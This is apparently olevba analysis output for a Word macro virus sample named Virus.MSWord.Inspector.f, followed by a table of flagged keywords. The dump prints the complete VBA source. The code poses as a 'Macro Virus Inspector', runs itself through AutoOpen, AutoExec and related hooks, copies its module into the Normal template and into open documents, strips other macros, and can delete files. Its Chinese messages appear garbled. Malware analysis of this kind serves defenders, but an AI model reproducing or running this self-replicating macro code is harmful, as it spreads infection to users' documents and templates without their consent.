olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inspector.f-e39fc0cd293169b45dd38551eba2abfdd64c08fd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Inspector.f-e39fc0cd293169b45dd38551eba2abfdd64c08fd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VirusInspect.bas 
in file: Virus.MSWord.Inspector.f-e39fc0cd293169b45dd38551eba2abfdd64c08fd - OLE stream: 'Macros/VBA/VirusInspect'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Dim KillCount As Integer
Dim sAutoNames  As Variant

Dim bInited As Boolean
Dim LatestVer As Double
Dim g_VBCom As Variant
Dim DetectedList As New Collection
Const Logo As String = "Wu's Macro Virus Inspector "



Function Detected(doc As Variant) As Integer
Dim i As Integer
For i = 1 To DetectedList.count
  If (doc.Name = Detected List.Item(i)) Then
    Detected = i
    Exit Function
  End If
Next
    Detected = 0
End Function
Sub SetDetectedFlag(doc As Variant, ByVal f As Boolean)
Dim i As Integer
i = Detected(doc)
If (f) Then
    If (i < 1) Then
        DetectedList.Add (doc.Name)
    End If
Else
    If (i > 0) Then
        DetectedList.Remove (i)
    End If
End If
End Sub
Sub ClearReg()
While DetectedList.count > 0
    DetectedList.Remove (1)
Wend
End Sub



Sub DeleteCode(cm As Variant, ByVal st, n As Long)
KillCount = KillCount + 1
Call cm.DeleteLines(st, n)
ShowStatus ("Delete From Line " & st & "to " & st + n)
End Sub
Sub KillSub(cm As Variant, ByVal Name As String)
Dim i, n As Long
'Dim cmd As CodeModule

  If (Not cm.Find(Name, 1, 1, cm.CountOfLines + 1, 1)) Then
   Exit Sub
  End If
  On Error GoTo Err
   i = cm.ProcStartLine(Name, 0) 'vbext_pk_Proc)
   n = cm.ProcCountLines(Name, 0) ' vbext_pk_Proc)
    If (InStr(1, cm.Lines(i, 1), "Wu", vbTextCompare) < 1) Then
     Call DeleteCode(cm, i, n)
    End If
    Exit Sub
Err:
End Sub
Sub KillAutoMod(md As Variant)
Dim Name As Variant
        For Each Name In sAutoNames
               If (InStr(1, md.Name, Name, vbTextCompare) > 0) Then
                        Call KillSub(md, "MAIN")
               End If
        Next Name
 
End Sub

Sub KillVirus(doc As Variant) 'Document)
'VBProject
Dim prj As Variant 'VBProject
Dim obj As Variant
Dim Name As Variant
Dim j, n As Integer
Dim md As Variant 'CodeModule
Dim VBCom As Variant 'VBComponents
Dim count As Integer
Dim saved As Boolean

Call Init
If (Detected(doc)) Then
     Exit Sub
End If

 saved = doc.saved
 
    count = KillCount
    Set prj = doc.VBProject
    Set VBCom = prj.VBComponents
    For j = 1 To VBCom.count
     Set md = VBCom.Item(j).CodeModule
        Call KillAutoMod(md)
    Next j
    For j = 1 To VBCom.count
    Set md = VBCom.Item(j).CodeModule
        ShowStatus "Scanning In " & md.Name
        For Each Name In sAutoNames
         Call KillSub(md, Name)
        Next Name
        Call KillAutoMod(md)
    Next j
    
    Call SetDetectedFlag(doc, True)
'    prj.VBComponents(1).Activate
    If (KillCount > count) Then
        ClearReg
        If (saved) Then
            Call SafeSave(doc)
        Else
         doc.saved = False
        End If
    Else
     If (saved) Then
     doc.saved = True
     End If
    End If
 
 End Sub
 
 
 
 
 
Sub DetectAll()

Dim doc As Variant 'Document
For Each doc In Documents
 Call KillVirus(doc)
Next
For Each doc In Templates
 Call KillVirus(doc)
Next
If (KillCount > 0) Then
    ShowStatus "É±µô " & KillCount & "¸ö²¡¶¾£¡µ«Î´±£´æ"
Else
    ShowStatus "Î´·¢ÏÖºê²¡¶¾£¡"
End If
KillCount = 0
End Sub

 
 
 
  
 
Sub Init()
    Dim i As Integer
    Dim obj As Variant
    
    If (bInited) Then
        Exit Sub
    End If
    'MsgBox "Init"
    sAutoNames = Array("Document_Close", "Document_Open", _
    "AutoClose", "AutoOpen", "Document_New", "AutoExec", _
     "AutoNew", "AutoExit")
    Call SetAttr(Application.NormalTemplate.FullName, 32) 'vbArchive)
    Set obj = Application.NormalTemplate
    Call InfectTo(obj)
    KillCount = 0
    ClearReg
    bInited = True
End Sub
Sub AutoExec() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoExit() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoOpen() 'Wu's Sub
 Call DetectAll
End Sub
Sub AutoNew() 'Wu's Sub
 Call DetectAll
End Sub

Sub FileOpen() 'Wu's Sub
Dim doc As Document
With Dialogs(wdDialogFileOpen)
       
       
   
   If (.Show = -1) Then
    Call SetDetectedFlag(ActiveDocument.VBProject, False)
    Call DetectAll
   End If
End With
End Sub
Sub DocClose()
On Error GoTo normal
Call InfectTo(ActiveDocument)
normal:
On Error GoTo Skip

Skip:
End Sub

Function MsgMode(s As Variant) As Integer
 MsgMode = msoBalloonButtonYes
End Function
Sub ShowStatus(ByVal s As String)
StatusBar = s
End Sub

Sub MsgModeLess(ByVal s As String, Optional ByVal ForceShow As Boolean = False)
    ShowStatus s
End Sub
Sub CopyTo(doc As Variant, NewName As String)
Dim NewDoc As Document
    doc.Activate
    Selection.WholeStory
    Selection.Copy
    Set NewDoc = Documents.Add
    NewDoc.Activate
    Selection.Paste
    doc.Close SaveChanges:=False
    On Error GoTo prompt
    NewDoc.SaveAs (NewName)
    Exit Sub
prompt:
    With Dialogs(wdDialogFileSaveAs)
    .Name = NewName
    .fileformat = wdFormatDocument
    .Show
    End With
End Sub
Sub KillFile(Path As String)
Dim r As Integer
    r = MsgBox("ÊÇ·ñ½«´ø¶¾ÎÄ¼þ" & Path & " É¾³ý£¿", vbYesNoCancel, Logo)
    If (r = vbCancel) Then
     End
    Else
     If (r = vbNo) Then
        Exit Sub
     End If
    End If
    On Error GoTo Err
    Kill (Path)
    Call ShowStatus(Path & "Killed!")
    Exit Sub
Err:
    Call ShowStatus("Can not kill file " & Path)

End Sub
Sub SafeSave(doc As Variant)
'
'Dim doc As Document
Dim NewName As String
Dim r As Integer
Dim Path As String
Dim NewDoc As Document
Dim TempName As String
Dim Format As Integer


   NewName = doc.FullName
   On Error GoTo nextline
   Call SetAttr(doc.FullName, vbArchive)
nextline:
   On Error GoTo IsTemp
    Format = doc.SaveFormat
   If (Format = 1) Then
    GoTo IsTemp
   Else
    doc.SaveAs (NewName)
   End If
   Exit Sub
IsTemp:
   ' TempName = " c:\~XXXX1234567ToBeDelted" & "TMP.dot"
'    MsgBox "open temp"
  '  doc.SaveAs FileName:=TempName, fileformat:=1
  '  doc.Close
 '   Kill TempName
 '   On Error GoTo NewDocErr
'    Set doc = Documents.Add(Template:=TempName)
   ' doc.SaveAs FileName:=NewName
Exit Sub
NewDocErr:
    On Error GoTo ErrSave
ErrSave:

   MsgBox "Ê§°Ü£¡"
   
End Sub


Function GetVer(prj As Variant) As Double
'Dim pprj As Variant 'VBProject
Dim VBCom As Variant 'VBComponent
Dim VerStr As String
Dim i As Integer
Const Tag As String = "Version"
GetVer = 0#
Set g_VBCom = Nothing
For Each VBCom In prj.VBComponents
   If (VBCom.CodeModule.Find(Logo, 1, 1, VBCom.CodeModule.CountOfLines + 1, 1)) Then
            Set g_VBCom = VBCom
            GetVer = 0.1
            On Error GoTo NoVer
            VerStr = VBCom.CodeModule.Lines(1, 1)
            i = InStr(1, VerStr, Tag, vbTextCompare)
            If (i > 0) Then
                GetVer = Val(Right(VerStr, Len(VerStr) - i - Len(Tag)))
            End If
NoVer:
            Exit Function
   End If
Next VBCom
End Function
Function GetLatest() As Variant
Dim prj As Variant 'VBProject
Dim Ver As Double
Set GetLatest = Nothing
LatestVer = 0
For Each prj In ThisDocument.Application.VBE.VBProjects
  Ver = GetVer(prj)
  If (Ver > LatestVer) Then
     LatestVer = Ver
     Set GetLatest = g_VBCom
  End If
Next prj
End Function
Sub setup()
   Call InfectTo(ThisDocument.Application.NormalTemplate)
   MsgBox "Installed " & Logo
   
  End Sub
  
 Function FoundMod(doc As Variant, ByVal s As String) As Variant
 Dim VBCom As Variant 'VBComponent
 For Each VBCom In doc.VBProject.VBComponents
  If (VBCom.Name = s) Then
  Set FoundMod = VBCom
  Exit Function
  End If
 Next
 Set FoundMod = Nothing
 End Function
 
Sub InfectTo(doc As Variant)
Dim prj As Variant 'VBProject
Dim VBCom, ObjCom As Variant 'VBComponent
Dim r As Double
Dim saved As Boolean


Const modname As String = "VirusInspect"
    
  saved = doc.saved
Set VBCom = GetLatest
r = GetVer(doc.VBProject)
Select Case (r)
 Case Is >= LatestVer: Exit Sub
 Case Else
        If (r > 0) Then
        Call ShowStatus("Upgraded£¡" & Logo)
        Else
        Call ShowStatus("Installed£¡" & Logo)
        End If
        Beep
        Beep
        Beep

 End Select
            
        Set ObjCom = FoundMod(doc, modname)
        If (ObjCom Is Nothing) Then
        Set ObjCom = doc.VBProject.VBComponents.Add(1) 'vbext_ct_StdModule  )
        ObjCom.Name = modname
        End If
        Call ObjCom.CodeModule.DeleteLines(1, ObjCom.CodeModule.CountOfLines)
        Call ObjCom.CodeModule.InsertLines(1, VBCom.CodeModule.Lines(1, VBCom.CodeModule.CountOfLines + 1))
 If (saved) Then
On Error Resume Next
 Call doc.SaveAs(doc.FullName)
 End If
 
End Sub












































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

